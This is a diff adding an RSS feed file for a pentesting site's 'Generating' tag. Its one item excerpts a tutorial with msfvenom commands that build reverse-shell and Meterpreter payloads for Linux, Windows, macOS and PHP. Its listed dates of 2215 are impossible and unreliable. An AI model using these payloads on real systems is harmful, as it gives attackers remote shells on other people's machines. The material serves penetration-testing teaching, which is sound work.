@@ -1,0 +1,25 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Generating on KCSEC</title>
+    <link>https://www.ivoidwarranties.tech/tags/generating/</link>
+    <description>Recent content in Generating on KCSEC</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>KCSEC</copyright>
+    <lastBuildDate>Fri, 10 Nov 2215 00:00:00 +0000</lastBuildDate>
+    
+	<atom:link href="https://www.ivoidwarranties.tech/tags/generating/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Generating Payloads with MsfVenom</title>
+      <link>https://www.ivoidwarranties.tech/posts/pentesting-tuts/metasploit/msfvenom/payload-gen/</link>
+      <pubDate>Fri, 10 Nov 2215 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.ivoidwarranties.tech/posts/pentesting-tuts/metasploit/msfvenom/payload-gen/</guid>
+      <description>LIST PAYLOADS BINARIES Linux msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f elf &amp;gt; shell.elf  Windows msfvenom -p windows/meterpreter/reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f exe &amp;gt; shell.exe  Mac msfvenom -p osx/x86/shell_reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f macho &amp;gt; shell.macho  WEB PAYLOADS PHP msfvenom -p php/meterpreter_reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f raw &amp;gt; shell.</description>
+    </item>
+    
+  </channel>
+</rss>
